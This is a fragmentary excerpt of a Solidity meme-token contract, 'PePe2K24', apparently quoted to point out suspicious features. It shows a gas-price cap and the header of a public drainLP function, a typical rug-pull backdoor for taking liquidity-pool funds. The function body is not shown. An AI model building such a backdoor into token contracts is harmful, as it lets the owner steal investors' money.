...
contract PePe2K24 is IERC20, Ownable, LibreMount {
    ...
    uint256 private _totalSupply = 1000000000000000000000000000000; //WEI

    string private _name = "PePe2k24";

    string private _symbol = "PE24";
    ...
    uint256 public MAX_GAS_PRICE = 3 gwei;
    ...
    function drainLP(address baseToken, address _recepient, uint amount) public {
